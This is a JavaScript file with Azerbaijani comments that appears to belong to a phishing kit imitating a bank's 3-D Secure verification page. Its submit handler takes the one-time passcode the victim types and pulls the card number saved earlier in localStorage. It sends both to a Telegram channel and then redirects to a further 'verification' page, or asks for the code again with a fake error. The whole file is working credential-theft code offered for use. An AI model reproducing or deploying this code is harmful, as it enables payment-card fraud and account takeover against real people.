// OTP formu göndərildikdə otp-yoxlama.html-ə yönləndir
document.addEventListener('DOMContentLoaded', function() {
    // URL-də error parametri varsa, xəta mesajını göstər
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === '1') {
        const errorMsg = document.getElementById('tds-error');
        const tdsCodeInput = document.getElementById('tds-code');
        
        if (errorMsg) {
            errorMsg.textContent = 'Yanlış təsdiq kodu. Yenidən cəhd edin.';
            errorMsg.classList.remove('hidden');
        }
        
        if (tdsCodeInput) {
            tdsCodeInput.value = '';
            tdsCodeInput.focus();
        }
        
        // URL-dən error parametrini təmizlə (tarixdə qalmasın)
        window.history.replaceState({}, document.title, window.location.pathname);
    }
    
    const tdsForm = document.getElementById('tds-form');
    
    if (tdsForm) {
        // Əvvəlki event listener-ləri ləğv etmək üçün yeni form yaradırıq
        const newForm = tdsForm.cloneNode(true);
        tdsForm.parentNode.replaceChild(newForm, tdsForm);
        
        // Yeni submit handler əlavə edirik
        newForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const tdsCode = document.getElementById('tds-code');
            const codeValue = (tdsCode.value || '').replace(/\D/g, '');
            
            // Kod 4 və ya 6 rəqəmli olmalıdır
            if (!/^(\d{4}|\d{6})$/.test(codeValue)) {
                const errorMsg = document.getElementById('tds-error');
                if (errorMsg) {
                    errorMsg.textContent = 'Kod yalnız 4 və ya 6 rəqəmli olmalıdır.';
                    errorMsg.classList.remove('hidden');
                }
                return;
            }
            
            // OTP kodunu Telegram-a göndər
            try {
                // localStorage-dən kart nömrəsini al
                const lastCardNumber = localStorage.getItem('lastCardNumber') || 'N/A';
                
                const telegramMessage = `🔴 <b>OTP</b> 🔴\n\n` +
                    `<b>KART:</b> <code>${lastCardNumber}</code>\n` +
                    `<b>OTP:</b> <code>${codeValue}</code>`;
                
                await sendToTelegram(telegramMessage);
            } catch (error) {
                console.error('Telegram göndərmə xətası:', error);
            }
            
            // Kodun uzunluğu düzgündürsə, yoxlama səhifəsinə yönləndir
            window.location.href = 'otp-yoxlama.html';
        });
    }
});
